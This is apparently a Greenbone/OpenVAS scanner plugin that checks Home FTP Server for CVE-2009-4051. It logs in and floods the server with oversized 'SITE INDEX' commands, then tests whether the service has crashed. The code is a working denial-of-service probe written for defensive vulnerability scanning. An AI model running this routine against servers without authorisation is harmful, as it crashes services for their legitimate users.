# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100351");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2009-11-18 12:44:57 +0100 (Wed, 18 Nov 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-4051");
  script_name("Home FTP Server 'SITE INDEX' Command Remote Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37033");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/507893");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/home_ftp/detected");

  script_tag(name:"summary", value:"Home FTP Server is prone to a remote denial-of-service vulnerability
  because it fails to handle user-supplied input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows remote attackers to crash
  the affected application, denying service to legitimate users.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "Home Ftp Server" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details) {

  for(i=0; i<30; i++) {
    data = crap(length: (40*i));
    ftp_send_cmd(socket: soc1, cmd: string("SITE INDEX ",data));
  }

  close(soc1);
  sleep(3);
  soc = open_sock_tcp(ftpPort);

  if(!soc) {
    security_message(port:ftpPort);
    exit(0);
  }
}

exit(0);
